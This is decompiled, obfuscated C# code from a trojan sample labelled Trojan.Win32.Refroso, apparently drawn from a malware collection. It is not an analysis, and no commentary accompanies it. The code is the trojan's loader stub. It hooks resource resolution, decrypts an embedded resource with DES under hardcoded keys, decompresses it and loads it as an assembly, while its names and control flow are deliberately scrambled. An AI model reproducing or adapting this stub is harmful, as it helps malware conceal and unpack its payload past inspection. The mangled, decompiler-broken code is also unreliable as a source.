// Decompiled with JetBrains decompiler
// Type: .
// Assembly: C, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F25E1EAB-EB04-4ECD-A70E-0143E63DFF03
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Refroso.hrpz-e40496d5f84ff83ebc4a14536714c2842f292149aa58d7861f48ee8d2476be88.exe

using \u0008;
using \u000F;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u000F
{
  internal sealed class \u0007
  {
    private static Assembly \u0001;
    private static string[] \u0001;

    private static Assembly \u0002([In] object obj0, [In] ResolveEventArgs obj1)
    {
      Stream stream1;
      MemoryStream memoryStream1;
      byte[] numArray1;
      int index;
      Stream manifestResourceStream;
      try
      {
        if (\u0007.\u0001 != null)
          goto label_8;
        else
          goto label_16;
label_1:
        int num;
        while (true)
        {
          switch (num)
          {
            case 0:
              if (manifestResourceStream != null)
              {
                stream1 = (Stream) new DeflateStream((Stream) new CryptoStream(manifestResourceStream, new DESCryptoServiceProvider().CreateDecryptor(BitConverter.GetBytes(18122633819222251623UL), BitConverter.GetBytes(12117726801826278022UL)), CryptoStreamMode.Read), CompressionMode.Decompress);
                num = 1;
                continue;
              }
              goto label_8;
            case 1:
              memoryStream1 = new MemoryStream();
              break;
            case 2:
              numArray1 = new byte[4096];
              num = 3;
              continue;
            case 3:
              goto label_6;
            default:
              if (false)
                break;
              goto label_14;
          }
          num = 2;
        }
label_6:
        while ((index = \u0017\u0003.\u007E\u009D\u0006((object) stream1, numArray1, 0, 4096)) != 0)
          \u0018\u0003.\u007E\u009F\u0006((object) memoryStream1, numArray1, 0, index);
        \u0007.\u0001 = \u0001\u0005.\u007E\u0098\u0005((object) (\u0007.\u0001 = \u009E\u0004.\u0095\u0005(\u0003\u0005.\u007E\u0015\u0007((object) memoryStream1))));
        goto label_8;
label_14:
        for (; index < \u0007.\u0001.Length; ++index)
        {
          if (\u0089\u0003.\u000F\u0002(\u0007.\u0001[index], \u001E\u0003.\u007E\u0007\u0003((object) obj1)))
            return \u0007.\u0001;
        }
        goto label_15;
label_8:
        if (\u0007.\u0001 != null)
        {
          index = 0;
          num = 4;
          goto label_1;
        }
label_15:
        return (Assembly) null;
label_16:
        manifestResourceStream = \u0002\u0005.\u0099\u0005().GetManifestResourceStream(\u000F.\u0008.\u0002("⼜⸞ဠᨢ䜤䘦䨨Ḫᴬ䴮̰ȲĴ唶嬸帺мా╀❂癄癆⭈筊祌ⵎ桐晒㍔摖㽘㡚", 0));
        num = 0;
        goto label_1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) index;
        Stream stream2 = manifestResourceStream;
        MemoryStream memoryStream2 = memoryStream1;
        byte[] numArray2 = numArray1;
        Stream stream3 = stream1;
        object obj = obj0;
        ResolveEventArgs resolveEventArgs = obj1;
        \u0005.\u0002(ex, (object) local, (object) stream2, (object) memoryStream2, (object) numArray2, (object) stream3, obj, (object) resolveEventArgs);
        throw;
      }
    }

    internal static void \u0002()
    {
      try
      {
        \u0008\u0004.\u0010\u0003().ResourceResolve += new ResolveEventHandler(\u0007.\u0002);
      }
      catch (Exception ex)
      {
        \u0005.\u0002(ex);
        throw;
      }
    }
  }
}
